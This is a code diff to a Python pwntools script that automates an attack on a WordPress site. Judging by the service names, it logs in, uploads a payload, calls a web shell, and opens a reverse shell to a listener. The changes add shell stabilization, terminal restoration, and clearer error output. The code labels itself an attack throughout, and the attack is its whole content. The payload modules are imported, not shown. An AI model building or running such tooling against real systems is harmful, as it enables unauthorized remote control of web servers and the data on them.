@@ -1,20 +1,26 @@
 #!/usr/bin/env python3
 
-import os
-import threading
+import os, sys, termios, threading
 from argparse import Namespace
-from pwnlib.log import Logger, install_default_handler
+from pwnlib.log import install_default_handler, getLogger
 from pwnlib.tubes.listen import listen
 from services import LoginService, PayloadService, ShellService, ParametersParserService
 
 install_default_handler()
-log = Logger()
-
+old_tty = termios.tcgetattr(sys.stdin)
+log = getLogger('pwnlib')
 
 def shell_handler(shell: listen):
     while shell.connected('recv'): pass
     shell.shutdown('send')
+
+    # Restore terminal conf and exit
+    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
+
+    log.setLevel(1)
+    log.info(f'Closed connection to {shell.rhost} port {shell.rport}')
     os._exit(0)
+
 
 def main(args: Namespace):
     wp_url = args.wp_url
@@ -38,15 +44,22 @@ def main(args: Namespace):
 
     with log.progress('Getting a reverse shell...') as p:
         shell_service = ShellService(web_shell_url, lhost, lport)
-        shell = shell_service.prepareListener()
-        shell_service.executeRevShell()
+        shell = shell_service.prepare_listener()
+        shell_service.execute_rev_shell()
         shell.recvline_contains(b'$', timeout=0.5) # Check shell came back
         p.success('Got a shell!')
     
-    # Start shell checker to control the closing
-    shell_handler_thread = threading.Thread(target=shell_handler, args=(shell,))
-    shell_handler_thread.setDaemon(True)
-    shell_handler_thread.start()
+    with log.progress('Trying to stabilize the shell...') as p:
+        shell_service.stabilize_shell(shell)
+        # Start shell checker to control the closing
+        shell_handler_thread = threading.Thread(target=shell_handler, args=(shell,))
+        shell_handler_thread.setDaemon(True)
+        shell_handler_thread.start()
+        p.success('Shell stabilized!')
+    
+    print('\r', end='')
+    log.info('Switching to interactive mode')
+    log.setLevel('error')
 
     shell.interactive()
 
@@ -60,5 +73,6 @@ if __name__ == '__main__':
         main(args)
     except KeyboardInterrupt:
         log.failure('Interrupted')
-    except Exception:
+    except Exception as e:
+        print(e)
         log.failure('Attack failed!')
